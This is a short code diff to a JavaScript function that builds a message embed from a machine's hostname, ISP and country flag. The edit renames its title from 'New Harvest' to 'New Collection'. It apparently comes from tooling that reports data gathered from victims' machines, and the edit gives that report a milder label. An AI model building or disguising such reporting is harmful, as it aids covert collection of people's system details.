@@ -391,7 +391,7 @@ function embedSys(info) {
     '> **ISP**       `' + info.isp + '`',
   );
   return {
-    title: flag + '  New Harvest \u2014 ' + info.hostname,
+    title: flag + '  New Collection \u2014 ' + info.hostname,
     color: 0x7c3aed,
     description: lines.join('\n'),
     timestamp: new Date().toISOString(),
